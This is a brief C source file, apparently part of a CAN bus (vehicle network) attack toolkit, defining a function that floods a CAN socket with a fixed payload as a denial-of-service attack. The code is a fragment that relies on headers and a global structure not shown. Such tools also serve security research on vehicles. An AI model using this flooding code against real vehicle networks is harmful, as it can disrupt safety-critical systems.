#include "all_headers.h"

/*================================================================
dos.c
This function performs the Denial of Service (DoS) attack

functions:
- dos_dos: send packets as fast as possible

==================================================================*/

void dos_dos(int socket, struct sockaddr_can *addr, int canid, int time_diff){
    do {
        send_can_packet(socket, addr, dos.payload1, dos.payload1_len, canid);
        if (time_diff == 0) break;
    } while (1);
}
